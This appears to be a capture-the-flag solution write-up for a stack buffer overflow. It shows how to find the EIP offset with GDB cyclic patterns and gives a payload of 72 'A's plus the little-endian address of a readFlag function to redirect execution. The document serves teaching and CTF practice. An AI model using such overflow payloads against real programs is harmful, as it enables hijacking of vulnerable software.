# Solution

## Step1- Find the overflow offset.

use GDB or manual fuzzing to find the exact bytes to reach $EIP.

GDB:
	-> use pattern_create to create a cyclic of 100 or more bytes.
	-> find the 4 bytes filling the EIP and use pattern_offset to find the offset.

## Step2: exploit by pointing the EIP to addr of readFlag.

Find the memory address of readFlag function using GDB or any other way.

GDB:
	-> `info func` (returns list of functions and it's corresponding address)
	->  print readFlag (prints address of the readFlag function)

Exploit:
	if the offset is 44, put in 44 'A's followed by the address in little-endian.
	payload -> "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16\x62\x55\x56"


Payload for this challenge:

## 72's A to fill the buffer, ESP + Mem-addr of readFlag()
``` run < <(echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16\x62\x55\x56")```
